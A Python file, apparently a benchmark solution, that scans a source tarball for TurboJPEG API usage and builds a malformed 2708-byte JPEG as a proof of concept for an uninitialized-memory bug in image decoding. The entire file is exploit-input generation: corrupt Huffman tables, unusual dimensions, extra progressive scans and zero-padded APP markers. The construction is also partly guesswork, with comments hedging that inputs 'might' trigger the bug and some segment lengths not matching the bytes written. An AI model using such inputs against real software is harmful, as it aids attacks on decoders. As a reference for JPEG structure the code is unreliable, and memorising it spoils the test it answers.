import os
import tarfile
import tempfile
import subprocess
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract source tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r:*') as tar:
                tar.extractall(tmpdir)
            
            # Look for TurboJPEG API usage patterns
            tjapi_found = False
            for root, dirs, files in os.walk(tmpdir):
                for file in files:
                    if file.endswith(('.c', '.cpp', '.h', '.hpp')):
                        filepath = os.path.join(root, file)
                        try:
                            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                if 'tj3Alloc' in content and 'tj3Compress' in content:
                                    tjapi_found = True
                                    break
                        except:
                            continue
                if tjapi_found:
                    break
            
            if not tjapi_found:
                # Fallback: generate a minimal JPEG that might trigger the issue
                return self._generate_minimal_jpeg()
            
            # Generate PoC based on TurboJPEG API vulnerability
            return self._generate_turbojpeg_poc()
    
    def _generate_minimal_jpeg(self) -> bytes:
        """Generate a minimal valid JPEG that might trigger uninitialized memory issues"""
        # JFIF header
        jpeg = b''
        
        # Start of Image
        jpeg += b'\xff\xd8'  # SOI
        
        # Application Default Header
        jpeg += b'\xff\xe0'  # APP0 marker
        jpeg += struct.pack('>H', 16)  # Length
        jpeg += b'JFIF\x00'  # Identifier
        jpeg += b'\x01\x02'  # Version
        jpeg += b'\x00'      # Density units
        jpeg += struct.pack('>H', 1)  # X density
        jpeg += struct.pack('>H', 1)  # Y density
        jpeg += b'\x00\x00'  # Thumbnail
        
        # Quantization Table
        jpeg += b'\xff\xdb'  # DQT marker
        jpeg += struct.pack('>H', 132)  # Length
        jpeg += b'\x00'      # Table info
        # Minimal quantization table (all 1s)
        jpeg += b'\x01' * 64
        
        jpeg += b'\xff\xdb'  # DQT marker
        jpeg += struct.pack('>H', 132)  # Length
        jpeg += b'\x01'      # Table info
        jpeg += b'\x01' * 64
        
        # Start of Frame (Baseline DCT)
        jpeg += b'\xff\xc0'  # SOF0 marker
        jpeg += struct.pack('>H', 17)  # Length
        jpeg += b'\x08'      # Precision
        jpeg += struct.pack('>H', 1)   # Height
        jpeg += struct.pack('>H', 1)   # Width
        jpeg += b'\x03'      # Components
        jpeg += b'\x01\x11\x00'  # Component 1
        jpeg += b'\x02\x11\x01'  # Component 2
        jpeg += b'\x03\x11\x01'  # Component 3
        
        # Huffman Tables
        # DC Table
        jpeg += b'\xff\xc4'  # DHT marker
        jpeg += struct.pack('>H', 29)  # Length
        jpeg += b'\x00'      # Table info
        # Minimal huffman table
        jpeg += b'\x00' * 16
        jpeg += b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b'
        
        # AC Table
        jpeg += b'\xff\xc4'  # DHT marker
        jpeg += struct.pack('>H', 181)  # Length
        jpeg += b'\x10'      # Table info
        jpeg += b'\x00' * 16
        jpeg += bytes(range(1, 162))
        
        # Start of Scan
        jpeg += b'\xff\xda'  # SOS marker
        jpeg += struct.pack('>H', 12)  # Length
        jpeg += b'\x03'      # Components
        jpeg += b'\x01\x00'  # Component 1
        jpeg += b'\x02\x11'  # Component 2
        jpeg += b'\x03\x11'  # Component 3
        jpeg += b'\x00\x3f\x00'  # Spectral selection
        
        # Minimal image data - single MCU
        # Using values that might trigger edge cases
        jpeg += b'\xff'  # Padding
        jpeg += b'\x00' * 100  # Zero data that might expose uninitialized buffers
        
        # End of Image
        jpeg += b'\xff\xd9'  # EOI
        
        # Pad to target length with data that won't break JPEG structure
        # but might trigger buffer allocation issues
        padding = 2708 - len(jpeg)
        if padding > 0:
            # Add APP markers with zeroed data to reach target size
            # This creates large buffers that might not be initialized
            while len(jpeg) < 2708:
                remaining = 2708 - len(jpeg)
                chunk = min(remaining, 65535)
                jpeg += b'\xff\xed'  # APP13 marker
                jpeg += struct.pack('>H', chunk)
                jpeg += b'\x00' * (chunk - 2)
        
        return jpeg[:2708]
    
    def _generate_turbojpeg_poc(self) -> bytes:
        """Generate PoC specifically for TurboJPEG buffer allocation issue"""
        # Create a JPEG with characteristics that might trigger the vulnerability:
        # - Progressive encoding
        # - Multiple scans
        # - Unusual dimensions
        # - Large buffers that might not be properly initialized
        
        jpeg = b''
        
        # SOI
        jpeg += b'\xff\xd8'
        
        # JFIF APP0
        jpeg += b'\xff\xe0'
        jpeg += struct.pack('>H', 16)
        jpeg += b'JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
        
        # APP1 with EXIF - creates additional buffer
        jpeg += b'\xff\xe1'
        app1_len = 200
        jpeg += struct.pack('>H', app1_len)
        jpeg += b'Exif\x00\x00'  # EXIF header
        # Minimal EXIF data
        jpeg += b'MM\x00\x2a\x00\x00\x00\x08'  # TIFF header
        jpeg += b'\x00' * (app1_len - 10)
        
        # Define Quantization Tables
        for i in range(4):
            jpeg += b'\xff\xdb'
            jpeg += struct.pack('>H', 132)
            jpeg += bytes([i])  # Table ID
            jpeg += b'\x01' * 64  # Minimal Q-table
        
        # Start of Frame (Progressive DCT)
        jpeg += b'\xff\xc2'  # SOF2 marker for progressive
        jpeg += struct.pack('>H', 17)
        jpeg += b'\x08'  # Precision
        # Unusual dimensions that might cause buffer miscalculation
        jpeg += struct.pack('>H', 17)  # Height - prime number
        jpeg += struct.pack('>H', 23)  # Width - prime number
        jpeg += b'\x03'  # 3 components
        jpeg += b'\x01\x22\x00'  # Component 1: 2x2 sampling
        jpeg += b'\x02\x11\x01'  # Component 2: 1x1 sampling
        jpeg += b'\x03\x11\x01'  # Component 3: 1x1 sampling
        
        # Multiple Define Huffman Tables
        for table_class in [0x00, 0x10]:  # DC and AC tables
            for table_id in range(4):
                jpeg += b'\xff\xc4'
                jpeg += struct.pack('>H', 181)
                jpeg += bytes([table_class | table_id])
                # Bogus Huffman table that's mostly zeros
                jpeg += b'\x00' * 16
                jpeg += b'\x00' * 162
        
        # Define Restart Interval
        jpeg += b'\xff\xdd'
        jpeg += struct.pack('>H', 4)
        jpeg += struct.pack('>H', 1)  # Small restart interval
        
        # Start of Scan for first scan
        jpeg += b'\xff\xda'
        jpeg += struct.pack('>H', 12)
        jpeg += b'\x03'
        jpeg += b'\x01\x00'
        jpeg += b'\x02\x11'
        jpeg += b'\x03\x11'
        jpeg += b'\x00\x00\x00'  # Spectral selection start/end, successive approx
        
        # Bogus compressed data for first scan
        # This data is designed to be parsed but trigger buffer issues
        scan_data = bytearray()
        for i in range(500):
            if i % 64 == 0:
                scan_data.append(0xff)  # Stuffing byte
                scan_data.append(0x00)
            else:
                scan_data.append(i & 0x7f)  # Avoid 0xff bytes
        
        jpeg += bytes(scan_data)
        
        # Additional scans to trigger multiple buffer allocations
        for scan_num in range(3):
            jpeg += b'\xff\xda'  # SOS
            jpeg += struct.pack('>H', 12)
            jpeg += b'\x01'  # Single component this time
            jpeg += bytes([(scan_num % 3) + 1])  # Component selector
            jpeg += b'\x00'  # Huffman table
            jpeg += b'\x00\x0f\x00'  # Full spectral range
            
            # More bogus data
            jpeg += b'\x00' * 200
        
        # Pad to exact target length with APP markers containing zeros
        # These create large buffers that might not be initialized
        while len(jpeg) < 2708:
            remaining = 2708 - len(jpeg)
            if remaining < 6:
                jpeg += b'\x00' * remaining
                break
            
            marker_len = min(remaining, 2000)
            jpeg += b'\xff\xec'  # APP12 marker
            jpeg += struct.pack('>H', marker_len)
            # Fill with zeros - uninitialized if buffer not allocated with tj3Alloc
            jpeg += b'\x00' * (marker_len - 2)
        
        # Ensure exact length
        return jpeg[:2708]